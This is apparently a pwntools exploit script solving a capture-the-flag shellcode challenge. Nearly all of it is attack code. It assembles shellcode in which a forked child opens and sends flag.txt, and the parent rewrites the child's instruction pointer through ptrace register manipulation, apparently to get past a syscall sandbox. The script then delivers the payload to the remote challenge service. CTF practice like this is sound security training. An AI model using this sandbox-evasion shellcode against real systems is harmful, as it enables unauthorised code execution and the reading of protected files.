#!/usr/bin/env python
# from ctypes import cdll
# libc = cdll.LoadLibrary('libc.so.6')
# from pathlib import Path
from pwn import *
sys.tracebacklimit = 3
context(endian = "little", encoding='ascii') # arch='amd64'
context.terminal = ["tmux", "splitw", "-h"]
const = constants
os.chdir('./dist')
exe_path = ('./chall')
e = context.binary = ELF(exe_path, checksec=False)
# libc_path = ('./glibc/libc.so.6')
# libc_path = ('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF(libc_path, checksec=False)
gdbscript = """\
#source /home/hacker/.gef.py
#gef config context.layout ''
# -- exe
break *0x401234
continue
# disp/3i $pc
"""
host, port = ('nc canon.ctf.theromanxpl0.it 7007').split()[-2:]
start_time = time.time()

def u64(b): return packing.u64(b.ljust(8, b'\0'))

def gdb_pause(interactive=False):
    if args.REMOTE: return
    d = r.clean(0.1)
    input(f'gdb {r.pid}')
    if interactive: r.interactive()
    r.unrecv(d)

def conn(argv=[]):
    if args.REMOTE:
        r = remote(host, int(port))
    elif args.GDB:
        r = gdb.debug(argv or [exe_path], exe=exe_path, gdbscript=gdbscript)
    else:
        r = process(argv or [exe_path])
    return r

code_addr  = 0xDEAD000
stack_addr = 0xDEAE000
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
RIP_OFFSET = 8*16 # in user_regs struct

code = ''.join([
    shellcraft.fork(),
    """\
    mov r13, rax /* save pid */
    cmp eax, 0
    jl .l_error
    cmp eax, 0
    jnz .l_parent
.l_child:
""",
    shellcraft.ptrace(const.PTRACE_TRACEME, 0, 0, 0),
    """\
    int3
    lea rdi, [rip + .l_flag]
""",
    shellcraft.open('rdi', 0),
    """
.l_sendfile:
    mov esi, eax
""",
    shellcraft.sendfile(1, 'rsi', 0, 0x50),
"""
    hlt
.l_parent:
""",
    # PTRACE_TRACEME in child so no need to attach
    #shellcraft.ptrace(const.PTRACE_ATTACH, 'r13', 0, 0),
    shellcraft.wait4(0),
    shellcraft.ptrace(const.PTRACE_SYSCALL, 'r13', 0, 0),
    shellcraft.wait4(0),
    f"""    mov r14, {stack_addr:#x} /* old_regs */\n""",
    shellcraft.ptrace(PTRACE_GETREGS, 'r13', 0, 'r14'),
    f"""\
    lea r12, [{stack_addr + RIP_OFFSET:#x}]
    mov rdi, 0x820000000000
    mov [r12], rdi
""",
    shellcraft.ptrace(PTRACE_SETREGS, 'r13', 0, 'r14'),
    shellcraft.ptrace(const.PTRACE_CONT, 'r13', 0, 0),
    shellcraft.wait4(0),
    shellcraft.ptrace(PTRACE_GETREGS, 'r13', 0, 'r14'),
    f"""\
    lea r12, [{stack_addr + RIP_OFFSET:#x}]
    lea rdi, [rip + .l_sendfile]
    mov [r12], rdi
""",
    shellcraft.ptrace(PTRACE_SETREGS, 'r13', 0, 'r14'),
    shellcraft.ptrace(const.PTRACE_SYSCALL, 'r13', 0, 0),
    shellcraft.wait4(0),
    shellcraft.ptrace(PTRACE_GETREGS, 'r13', 0, 'r14'),
    f"""\
    lea r12, [{stack_addr + RIP_OFFSET:#x}]
    mov rdi, 0x820000000000
    mov [r12], rdi
""",
    shellcraft.ptrace(PTRACE_SETREGS, 'r13', 0, 'r14'),
    shellcraft.ptrace(const.PTRACE_CONT, 'r13', 0, 0),
    shellcraft.wait4(0),
    """\
    hlt
.l_error:
    ud2
.l_flag: .asciz "flag.txt"
"""
])
# with context.silent:
with context.quiet:
    shellcode = asm(code)
    open('sc.bin', 'wb').write(shellcode)

r = conn(['/bin/stdbuf', '-o0', exe_path])
def main():
    global r
    r.sendlineafter('size: ', str(len(shellcode)))
    gdb_pause()
    r.sendafter('shellcode: ', shellcode)
    time.sleep(0.1 if not args.REMOTE else 1)
    pass

try:
    main()
    log.success(f'duration: {time.time() - start_time}')
    # r.clean(0.2)
    r.interactive()
# except KeyboardInterrupt:
#     import traceback
#     traceback.print_exc()
#     exit(2)
except Exception as exc:
    raise exc
